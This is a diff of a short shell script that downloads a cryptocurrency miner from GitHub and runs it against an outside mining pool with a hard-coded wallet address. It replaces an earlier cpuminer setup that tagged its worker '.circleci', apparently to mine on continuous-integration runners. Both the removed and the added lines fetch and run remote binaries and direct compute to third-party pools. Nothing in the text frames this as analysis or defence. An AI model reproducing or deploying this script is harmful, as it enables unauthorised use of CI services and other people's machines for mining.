@@ -1,9 +1,8 @@
 #!/bin/sh
 
 # Donwload File
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz 
-while [ 1 ]; do
-./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.circleci -t2
-sleep 2
-done
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 2
+
